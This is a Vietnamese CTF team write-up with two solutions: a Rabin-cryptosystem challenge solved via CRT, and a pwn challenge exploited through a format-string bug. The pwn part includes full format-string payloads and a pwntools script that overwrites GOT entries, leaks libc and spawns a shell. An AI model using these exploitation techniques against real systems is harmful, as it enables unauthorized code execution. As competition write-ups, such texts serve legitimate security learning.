# WannaGame Chapionship

![img](https://github.com/datnlq/Source/blob/main/CTF/img/54010N.png?raw=true)

Chào các bạn, team mình vừa tham gia giải WannaOne tổ chức vừa qua và giải được 1 vài challenge, sau đây mình sẽ tổng hợp lại các writeup của cả team đã solve được :3

### Baby Square Root (Crypto)
![img](https://github.com/datnlq/Source/blob/main/CTF/img/baby_square_root.png?raw=true)
```
fromCrypto.Util.number import bytes_to_long, getPrime
from secret import flag

m = bytes_to_long(flag)

def genkey(nbits):
    while True:
        p, q, r = [getPrime(nbits) for _ in range(3)]
        if (p % 4 == 3) and (q % 4 == 3) and (r % 4 == 3):
            if (m % p)**2 > p and (m % p)**2 > q and (m % r)**2 > r:
                return p, q, r

p, q, r = genkey(256)
print("p = %d" % p)
print("q = %d" % q)
print("r = %d" % r)        
n = p * q * r
assert m * m > n
c = pow(m, 2, n)
print("c = %d" % c)
# p = 70983802669936779583888271861264418553792693554114299680738628616089490185419
# q = 58305592279975890783353046164122693676607057964958376141731197322666598532103
# r = 97916428487890361773100867250333330323792113286852927362830936108809145675571
# c = 133577637589652723069183361093768415945855108781724437021455876659182394384174818367149957719648205506911291215264096735072761818791817528925431287027255773272638623023278085524784625145794560351502585907066260712268740708335604444

```

Đọc hiểu đoạn code python trên chúng ta nhận ra 1 vài vấn đề như sau:

  + Đây là 1 bài [Rabin RSA](https://www.math.auckland.ac.nz/~sgal018/crypto-book/ch24.pdf)
  + q,p,r = 3 (mod 4)
  + Khi Legendre Symbol (x/N) = 1 thì x và n-x là 1 square modulo n

Dựa vào những phân tích ở trên ta có được các biểu thức sau:
  + mp = c^(p+1)/4 (mod p) => mp^2 = c (mod p)
  + mq = c^(q+1)/4 (mod q) => mq^2 = c (mod q)
  + mr = c^(r+1)/4 (mod r) => mr^2 = c (mod r)
  
 Từ những dữ kiện trên, ta dùng CRT để tính toán ra lại giá trị m. Dựa vào đó ta có code như sau:



```
from Crypto.Util.number import *
import gmpy2

p = 70983802669936779583888271861264418553792693554114299680738628616089490185419
q = 58305592279975890783353046164122693676607057964958376141731197322666598532103
r = 97916428487890361773100867250333330323792113286852927362830936108809145675571
c = 133577637589652723069183361093768415945855108781724437021455876659182394384174818367149957719648205506911291215264096735072761818791817528925431287027255773272638623023278085524784625145794560351502585907066260712268740708335604444
n = p * q * r

mp = pow(c, (p+1)//4, p)
mq = pow(c, (q+1)//4, q)
mr = pow(c, (r+1)//4, r)

print("mp = ", mp)
print("mq = ", mq)
print("mr = ", mr)

print(pow(mp, 2, p) == c%p)

yp = n//mq//mr
yq = n//mp//mr
yr = n//mp//mq

zp = inverse(yp, p)
zq = inverse(yq, q)
zr = inverse(yr, r)

m = (mp*yp*zp + mq*yq*zq + mr*yr*zr) 
m = 405251878563859034013993263635104394619048731139877286040011778613066766304610456261463756664887516315281979277436649271325146838356345161228881883353921803425724176576610588194813849282591846167918210163694920450096777213599649434
print(long_to_bytes(m))
print(long_to_bytes(n - m))
```
![img](https://github.com/datnlq/Source/blob/main/CTF/img/baby_square_root_flag.png?raw=true)

### letwarnup (Pwn)

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup.png?raw=true)

Đây là một challenge khá là khó khăn với mình :| vì mình ngồi hơn 8h mà vẫn bị ngáo vì bài này @@

Đầu tiên đề cho chúng ta 2 file: 1 file binary và 1 libc.

Sử dụng các câu lệnh cơ bản để kiểm tra file và dùng IDA Pro để xem souce như sau:


![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_checkfile.png?raw=true)

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_IDAmain.png?raw=true)

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_IDAvuln.png?raw=true)

Sau đó chúng ta chạy thử chương trình và gdb để phân tích rõ flow của chương trình hơn.

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_test.png?raw=true)

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_debug_findbuffaddress.png?raw=true)

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_debug_stack.png?raw=true)

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_buffad.png?raw=true)

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_retvuln.png?raw=true)

Sau 1 loạt hành động thử như trên thì mình rút ra được vài điều như sau:

  + Đây là lỗi fmt ở hàm vuln
  + Flow của chương trình sẽ dừng ở hàm exit() trong hàm vuln()
  + Input sẽ không được ghi vào stack mà sẽ được ghi vào 1 địa chỉ tồn tại trong stack


Sau khi rút ra được những điều trên thì mình lú mất tiêu rồi @@ giờ intput không có trong stack, địa chỉ của exit cũng không có trong stack :| Out of game rồi

Sau đó có 2 hint xuất hiện như sau: 

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_hint1.png?raw=true)

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_hint2.png?raw=true)

Hint đề cập đế old rbp và 1 kỹ thuật nghe khá là lạ tai là two stage write sau đó gọi ý chúng ta sẽ tác động đến địa chỉ trong GOT table Hhmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm

Sao vẫn có cảm giác out of game thế nhờ

Nhưng không sao, tư duy dần rõ ràng sau khi mình ngồi thêm vài tiếng :vv Mình đã có thể tạo ra địa chỉ của exit trên stack bằng old rbp của main được tại vuln, sau đó ta thay đổi giá trị của địa chỉ exit GOT bằng địa chỉ của hàm main để tạo ra 1 looping cho chúng ta khai thác
```
payload = b'%c%c%c%c%c%c%4210746c%lln%53743c%hn'
```
![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_payloadloop.png?raw=true)

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_payloadloop2.png?raw=true)

Sau đó chúng ta phải leak được lib base bằng cách leak địa chỉ của hàm trả về là __libc_start_main+243 với offset là 17 

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_retmain.png?raw=true)

![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_leaklibcbase.png?raw=true)

Tính toán và ghi hàm system và exit GOT để có thể exploit bằng kỹ thuật ret2libc :<


![img](https://github.com/datnlq/Source/blob/main/CTF/img/letwarnup_ret2libc.png?raw=true)

```
from pwn import *

BIN = "./letwarnup"
elf = ELF(BIN)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

def exploit():
	__breakpoint="""
		b*0x0000000000401278
		"""
	gdb.attach(io,__breakpoint)
	payload = b'%c%c%c%c%c%c%4210746c%lln%53743c%hn'
	io.sendlineafter(b'Enter your string:\n', payload)
	for i in range(1040):
	  io.recv()
	payload = b'%17$p'
	io.sendlineafter(b'Enter your string:\n', payload)
	libc.address = int(io.recv(14).decode(), 16) - libc.symbols['__libc_start_main'] - 243
	print('Libc base: ', hex(libc.address))
	io.sendlineafter(b'Enter your string:\n', b'%c%c%c%c%c%c%4210714c%lln')
	io.sendlineafter(b'Enter your string:\n', b'%c%c%c%c%c%c%4210716c%lln')
	offset = (libc.symbols['system'] & 0xff0000) >> 16
	syscall = libc.symbols['system'] & 0xffff
	print('Offset: ', hex(offset))
	print('System: ', hex(syscall))
	if offset < 14:
	  print('Fail: Offset < 14')
	  io.close()
	  exit(0)
	payload = '%c%c%c%c%c%c%c%c%c%c%c%c%c%c%' + str(offset - 14) + 'c%hhn%c%c%c%c%' + str(syscall - offset - 4) + 'c%hn'
	io.sendlineafter(b'Enter your string:\n', bytes(payload, 'utf-8'))
	io.sendlineafter(b'Enter your string:\n', b'/bin/sh\x00')
	io.interactive()
io = process(BIN)
#io = remote('45.122.249.68', 10005)
context.log_level = 'debug'
exploit()
```
























